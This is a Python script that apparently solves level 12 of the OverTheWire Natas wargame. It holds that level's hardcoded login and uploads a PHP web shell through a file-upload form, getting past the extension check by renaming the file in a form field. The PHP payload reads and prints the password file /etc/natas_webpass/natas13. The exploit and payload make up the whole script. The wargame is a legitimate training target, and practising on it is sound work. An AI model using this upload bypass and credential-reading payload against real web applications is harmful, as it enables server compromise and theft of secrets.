#!/usr/bin/env python3
#
# Solve Natas 12 -> 13.
#
import requests

url = 'http://natas12.natas.labs.overthewire.org/index.php'
auth = ('natas12', 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3')
# The extension from the stupid.php filename attribute
# will not be checked! If we modify the auto-generated
# form field it will pass through!
data = {'MAX_FILE_SIZE': 1000, 'filename': 'stupid.php'}

payload = '''\
<?php
$file = file_get_contents('/etc/natas_webpass/natas13');
echo $file
?>'''

files = {'uploadedfile': ('something.php', payload, 'image/jpeg')}

resp = requests.post(url, auth=auth, data=data, files=files)
print(resp.text)
